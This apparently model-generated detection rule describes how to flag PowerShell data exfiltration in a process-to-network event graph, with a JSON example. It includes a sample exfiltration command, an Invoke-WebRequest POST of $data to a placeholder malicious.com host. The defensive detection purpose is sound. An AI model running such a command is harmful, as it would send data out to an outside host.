<output>
1. **Identify Data Exfiltration via PowerShell**  
   - Monitor for events where the `srcNode` is a PowerShell process (e.g., `powershell.exe` or `pwsh.exe`).  
   - Set the `relation` to "Process Create" for the PowerShell process.  
   - Ensure the `dstNode` is a network connection to a suspicious domain (e.g., `http://malicious.com`).  
   - The `Cmdline` for the `srcNode` should include the command `Invoke-WebRequest -Uri http://malicious.com/exfiltrate -Method POST -Body $data`.  
   - Example:  
     ```json
     {
       "srcNode": {
         "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         "Cmdline": "powershell.exe -Command Invoke-WebRequest -Uri http://malicious.com/exfiltrate -Method POST -Body $data",
         "Type": "Process"
       },
       "dstNode": {
         "Dstaddress": "malicious.com",
         "Type": "Network"
       },
       "relation": "Process Create"
     }
     ```
</output>